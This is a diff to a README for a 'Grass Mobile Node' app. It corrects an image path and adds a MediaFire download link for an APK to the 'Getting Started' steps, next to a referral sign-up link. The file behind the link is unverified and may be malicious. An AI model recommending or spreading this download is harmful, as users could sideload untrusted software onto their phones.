@@ -1,6 +1,6 @@
 # Grass Mobile Node
 
-![GRASS](assets/img1/getgrass.png)
+![GRASS](assets/img/getgrass.png)
 
 **Grass Mobile Node** is a mobile application designed to let users run a Grass node on their mobile devices. Grass Mobile Node brings the power of Grass nodes, previously only available on browser extensions and desktop, into the convenience of mobile.
 
@@ -29,7 +29,7 @@ Grass nodes were previously limited to desktop applications and browser extensio
 
 ## Getting Started
 
-1. **Download the app**: 
+1. **Download the app**: [DOWNLOAD HERE](https://www.mediafire.com/file/86800w29k9h19kl/Get_Grass_Mobile.apk/file)
 2. **Create an Account**: Set up a new account [REGISTER](https://app.getgrass.io/register?referralCode=dVd4bPfawQRfeia) or login with your existing account
 3. **Connect Your Node**: Connect the node with only button click
 4. **Monitor Your Node**: Build in webview to help you monitoring your node
